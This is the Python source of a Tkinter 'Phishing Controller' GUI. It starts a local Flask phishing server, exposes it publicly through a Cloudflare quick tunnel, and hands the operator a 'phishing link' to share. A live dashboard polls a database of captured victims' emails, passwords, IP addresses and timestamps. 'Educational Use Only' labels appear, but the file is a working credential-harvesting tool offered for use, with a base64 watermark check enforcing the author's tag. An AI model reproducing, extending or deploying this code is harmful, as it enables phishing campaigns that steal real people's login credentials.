import tkinter as tk
from tkinter import scrolledtext, messagebox
import subprocess
import threading
import time
import os
import sqlite3
import base64
import sys
import urllib.request
import urllib.error

_WATERMARK = base64.b64decode("aGFja2VyYWtzaGFyYXRpdA==").decode('utf-8')

if not _WATERMARK or len(_WATERMARK) < 5:
    messagebox.showerror("Error", "Integrity check failed")
    sys.exit(1)

for s in ["hackeraksharatit"]:
    if s not in _WATERMARK:
        messagebox.showerror("Error", "Integrity check failed")
        sys.exit(1)

class PhishingController:
    def __init__(self, root):
        self.root = root
        self.root.title(f"{_WATERMARK}")
        self.root.geometry("850x750")
        self.root.configure(bg='#0a0e17')
        self.flask_process = None
        self.cloudflare_process = None
        self.public_url = ""
        self.is_running = False
        self.setup_ui()

    def setup_ui(self):
        title = tk.Label(self.root, text="Phishing Controller", font=('Arial', 24, 'bold'), fg='#00d4ff', bg='#0a0e17')
        title.pack(pady=20)

        tk.Label(self.root, text=f"{_WATERMARK}", font=('Arial', 9), fg='#445566', bg='#0a0e17').pack()

        tk.Label(self.root, text="Click to generate a new phishing link", font=('Arial', 12), fg='#8899aa', bg='#0a0e17').pack(pady=5)

        self.generate_btn = tk.Button(self.root, text="GENERATE NEW PHISHING LINK", font=('Arial', 14, 'bold'), bg='#00d4ff', fg='#0a0e17', padx=20, pady=15, command=self.start_server)
        self.generate_btn.pack(pady=30)

        self.status_label = tk.Label(self.root, text="Idle", font=('Arial', 12), fg='#ff6b6b', bg='#0a0e17')
        self.status_label.pack(pady=5)

        url_frame = tk.Frame(self.root, bg='#111b26', relief='ridge', bd=2)
        url_frame.pack(pady=10, padx=20, fill='x')

        tk.Label(url_frame, text="Your Phishing Link:", font=('Arial', 12, 'bold'), fg='#e0e0e0', bg='#111b26').pack(anchor='w', padx=10, pady=5)

        self.url_entry = tk.Entry(url_frame, font=('Arial', 11), fg='#00d4ff', bg='#0a0e17', width=60, relief='flat')
        self.url_entry.pack(padx=10, pady=10, fill='x')

        tk.Button(url_frame, text="Copy URL", font=('Arial', 10), bg='#1e2d3d', fg='#e0e0e0', command=self.copy_url).pack(pady=5)

        tk.Button(self.root, text="STOP SERVER", font=('Arial', 12, 'bold'), bg='#dc3545', fg='white', padx=20, pady=10, command=self.stop_server).pack(pady=10)

        dash_frame = tk.Frame(self.root, bg='#111b26', relief='ridge', bd=2)
        dash_frame.pack(pady=10, padx=20, fill='both', expand=True)

        tk.Label(dash_frame, text="Live Dashboard", font=('Arial', 14, 'bold'), fg='#00d4ff', bg='#111b26').pack(anchor='w', padx=10, pady=5)

        self.dashboard_text = scrolledtext.ScrolledText(dash_frame, height=12, bg='#0a0e17', fg='#e0e0e0', font=('Consolas', 10))
        self.dashboard_text.pack(padx=10, pady=10, fill='both', expand=True)

        tk.Label(self.root, text=f"Educational Use Only — {_WATERMARK}", font=('Arial', 10), fg='#445566', bg='#0a0e17').pack(pady=10)

        menubar = tk.Menu(self.root)
        self.root.config(menu=menubar)
        help_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="Help", menu=help_menu)
        help_menu.add_command(label="About", command=self.show_about)

        self.refresh_dashboard()

    def show_about(self):
        about_window = tk.Toplevel(self.root)
        about_window.title("About")
        about_window.geometry("450x300")
        about_window.configure(bg='#0a0e17')

        tk.Label(about_window, text="Phishing Controller", font=('Arial', 18, 'bold'), fg='#00d4ff', bg='#0a0e17').pack(pady=15)
        tk.Label(about_window, text="Version: 1.0", font=('Arial', 12), fg='#8899aa', bg='#0a0e17').pack()
        tk.Label(about_window, text=f"{_WATERMARK}", font=('Arial', 11), fg='#51cf66', bg='#0a0e17').pack(pady=10)
        tk.Label(about_window, text="Educational Use Only", font=('Arial', 12, 'bold'), fg='#ff6b6b', bg='#0a0e17').pack(pady=5)
        tk.Label(about_window, text="Unauthorized use is illegal.", font=('Arial', 10), fg='#445566', bg='#0a0e17').pack(pady=5)
        tk.Button(about_window, text="Close", command=about_window.destroy, bg='#1e2d3d', fg='#e0e0e0', padx=20).pack(pady=10)

    def start_server(self):
        if self.is_running:
            self.status_label.config(text='Server already running!', fg='#ffd93d')
            return

        self.is_running = True
        self.generate_btn.config(state='disabled', text='Starting...')
        self.status_label.config(text='Starting Flask server...', fg='#ffd93d')
        self.url_entry.delete(0, tk.END)
        threading.Thread(target=self.start_flask, daemon=True).start()

    def start_flask(self):
        try:
            os.chdir(os.path.dirname(os.path.abspath(__file__)))
            self.flask_process = subprocess.Popen(['python', 'app.py'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(5)
            for i in range(5):
                try:
                    urllib.request.urlopen('http://localhost:3000', timeout=2)
                    break
                except:
                    time.sleep(2)
            else:
                self.root.after(0, lambda: self.status_label.config(text='Flask failed to start', fg='#ff6b6b'))
                self.root.after(0, lambda: self.generate_btn.config(state='normal', text='GENERATE NEW PHISHING LINK'))
                self.is_running = False
                return

            self.root.after(0, lambda: self.status_label.config(text='Starting Cloudflare Tunnel...', fg='#ffd93d'))
            threading.Thread(target=self.start_cloudflare, daemon=True).start()

        except Exception as e:
            self.root.after(0, lambda: self.status_label.config(text=f'Error: {str(e)}', fg='#ff6b6b'))
            self.root.after(0, lambda: self.generate_btn.config(state='normal', text='GENERATE NEW PHISHING LINK'))
            self.is_running = False

    def start_cloudflare(self):
        try:
            os.chdir(os.path.dirname(os.path.abspath(__file__)))
            self.cloudflare_process = subprocess.Popen(['.\\cloudflared.exe', 'tunnel', '--url', 'http://localhost:3000'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)

            timeout = 45
            start_time = time.time()

            for line in self.cloudflare_process.stdout:
                if 'trycloudflare.com' in line:
                    url_start = line.find('https://')
                    if url_start != -1:
                        url_end = line.find(' ', url_start)
                        if url_end == -1:
                            url_end = len(line)
                        self.public_url = line[url_start:url_end].strip()
                        time.sleep(3)
                        self.root.after(0, lambda: self.url_entry.insert(0, self.public_url))
                        self.root.after(0, lambda: self.status_label.config(text='LIVE! Share the URL.', fg='#51cf66'))
                        self.root.after(0, lambda: self.generate_btn.config(state='normal', text='GENERATE NEW PHISHING LINK'))
                        return

                if time.time() - start_time > timeout:
                    self.root.after(0, lambda: self.status_label.config(text='Timeout: Cloudflare took too long', fg='#ff6b6b'))
                    self.root.after(0, lambda: self.generate_btn.config(state='normal', text='GENERATE NEW PHISHING LINK'))
                    self.is_running = False
                    return

        except Exception as e:
            self.root.after(0, lambda: self.status_label.config(text=f'Error: {str(e)}', fg='#ff6b6b'))
            self.root.after(0, lambda: self.generate_btn.config(state='normal', text='GENERATE NEW PHISHING LINK'))
            self.is_running = False

    def copy_url(self):
        url = self.url_entry.get()
        if url:
            self.root.clipboard_clear()
            self.root.clipboard_append(url)
            self.status_label.config(text='URL Copied!', fg='#51cf66')
            self.root.after(2000, lambda: self.status_label.config(text='LIVE! Share the URL.', fg='#51cf66'))

    def stop_server(self):
        if self.flask_process:
            self.flask_process.terminate()
            self.flask_process = None
        if self.cloudflare_process:
            self.cloudflare_process.terminate()
            self.cloudflare_process = None
        self.is_running = False
        self.status_label.config(text='Stopped', fg='#ff6b6b')
        self.generate_btn.config(state='normal', text='GENERATE NEW PHISHING LINK')

    def refresh_dashboard(self):
        try:
            conn = sqlite3.connect('database.db')
            data = conn.execute('SELECT email, password, ip, time FROM credentials ORDER BY id DESC LIMIT 20').fetchall()
            conn.close()

            self.dashboard_text.delete(1.0, tk.END)
            if data:
                self.dashboard_text.insert(tk.END, f"{'Email':<35} {'Password':<15} {'IP':<15} {'Time':<20}\n")
                self.dashboard_text.insert(tk.END, f"{'-'*85}\n")
                for row in data:
                    self.dashboard_text.insert(tk.END, f"{row[0]:<35} {row[1]:<15} {row[2]:<15} {row[3]:<20}\n")
            else:
                self.dashboard_text.insert(tk.END, "No data captured yet.")
        except:
            pass
        self.root.after(3000, self.refresh_dashboard)

if __name__ == '__main__':
    root = tk.Tk()
    app = PhishingController(root)
    root.mainloop()